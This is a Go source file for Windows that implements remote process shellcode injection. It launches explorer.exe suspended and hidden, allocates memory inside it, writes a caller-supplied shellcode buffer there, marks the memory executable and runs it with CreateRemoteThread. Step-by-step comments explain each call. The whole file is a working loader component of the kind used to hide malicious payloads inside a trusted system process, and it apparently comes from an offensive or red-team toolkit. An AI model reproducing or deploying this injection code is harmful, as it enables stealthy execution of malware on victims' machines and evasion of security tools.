//go:build windows
// +build windows

package utils

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateProcess() *syscall.ProcessInformation {
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	// explorer is a 64 bit process
	var Target = "C:\\Windows\\explorer.exe"

	commandLine, err := syscall.UTF16PtrFromString(Target)

	if err != nil {
		panic(err)
	}

	// Create the process with no window and in a suspended state
	err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	// return a pointer to the process info
	return &pi
}

func CreateRemoteThread(shellcode []byte) {
	// Import the kernel32 DLL
	// Source code: https://cs.opensource.google/go/x/sys/+/4e6760a1:windows/dll_windows.go;l=281
	// Blog: https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	// DLL is loaded so now we get a reference to the procedures
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
	closeHandle := kernel32.NewProc("CloseHandle")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE

	// Allocate read-write memory the size of the payload in the process
	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	// Write the shell code to the memory allocated
	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	// Change the rights of the memory from read-write to be read-execute
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pi.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	// Execute a remote thread of the specified process at the starting memory address
	_, _, errCreateRemoteThreadEx := createRemoteThread.Call(uintptr(pi.Process), 0, 0, lpBaseAddress, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}

	// Close the open object handle
	_, _, errCloseHandle := closeHandle.Call(uintptr(pi.Process))
	if errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

}
